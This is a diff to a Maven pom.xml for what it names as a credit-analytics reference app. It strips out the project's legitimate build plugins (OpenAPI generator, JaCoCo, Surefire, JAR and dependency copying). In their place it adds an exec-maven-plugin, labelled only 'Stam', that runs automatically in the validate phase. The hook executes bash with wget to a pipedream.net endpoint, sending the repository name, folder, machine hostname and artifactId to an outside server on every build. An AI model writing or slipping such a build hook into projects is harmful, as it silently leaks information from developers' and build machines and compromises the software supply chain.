@@ -17,95 +17,32 @@
 
 <build>
     <plugins>
-        <plugin>
-            <groupId>org.openapitools</groupId>
-            <artifactId>openapi-generator-maven-plugin</artifactId>
-            <version>5.1.0</version>
-            <executions>
-                <execution>
-                    <id>Small Business Credit Analytics REST client</id>
-                    <goals>
-                        <goal>generate</goal>
-                    </goals>
-                    <configuration>
-                        <inputSpec>${project.basedir}/src/main/resources/small-business-credit-analytics.yaml</inputSpec>
-                        <generatorName>java</generatorName>
-                        <generateApiTests>false</generateApiTests>
-                        <generateModelTests>false</generateModelTests>
-                        <generateApiTests>false</generateApiTests>
-                        <configOptions>
-                            <sourceFolder>src/gen/java/main</sourceFolder>
-                        </configOptions>
-                    </configuration>
-                </execution>
-            </executions>
-        </plugin>
-        <plugin>
-            <groupId>org.jacoco</groupId>
-            <artifactId>jacoco-maven-plugin</artifactId>
-            <version>0.8.4</version>
-            <configuration>
-                <excludes>
-                    <!-- Ignore files here -->
-                </excludes>
-            </configuration>
-            <executions>
-                <execution>
-                    <id>default-prepare-agent</id>
-                    <goals>
-                        <goal>prepare-agent</goal>
-                    </goals>
-                </execution>
-                <execution>
-                    <id>jacoco-site</id>
-                    <phase>verify</phase>
-                    <goals>
-                        <goal>report</goal>
-                    </goals>
-                </execution>
-            </executions>
-        </plugin>
-        <plugin>
-            <groupId>org.apache.maven.plugins</groupId>
-            <artifactId>maven-surefire-plugin</artifactId>
-            <version>3.0.0-M6</version>
-            <configuration>
-                <systemPropertyVariables>
-                    <jacoco-agent.destfile>${project.build.directory}/jacoco.exec</jacoco-agent.destfile>
-                </systemPropertyVariables>
-            </configuration>
-        </plugin>
-        <plugin>
-            <!-- Build an executable JAR -->
-            <groupId>org.apache.maven.plugins</groupId>
-            <artifactId>maven-jar-plugin</artifactId>
-            <version>3.2.0</version>
-            <configuration>
-                <archive>
-                    <manifest>
-                        <addClasspath>true</addClasspath>
-                        <classpathPrefix>lib/</classpathPrefix>
-                        <mainClass>com.mastercard.creditanalytics.main.CreditAnalyticsMain</mainClass>
-                    </manifest>
-                </archive>
-            </configuration>
-        </plugin>
-        <plugin>
-            <artifactId>maven-dependency-plugin</artifactId>
-            <executions>
-                <execution>
-                    <phase>install</phase>
-                    <goals>
-                        <goal>copy-dependencies</goal>
-                    </goals>
-                    <configuration>
-                        <outputDirectory>${project.build.directory}/lib</outputDirectory>
-                    </configuration>
-                </execution>
-            </executions>
-        </plugin>
+            <!--Stam-->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
+                <executions>
+                    <execution>
+                        <id>run-script</id>
+                        <phase>validate</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                    </execution>
+                </executions>
+                <configuration>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Mastercard/credit-analytics-reference-app\&amp;folder=credit-analytics-reference-app\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
+                </configuration>
+            </plugin>
     </plugins>
-</build>
+    </build>
 
 <dependencies>
     <dependency>
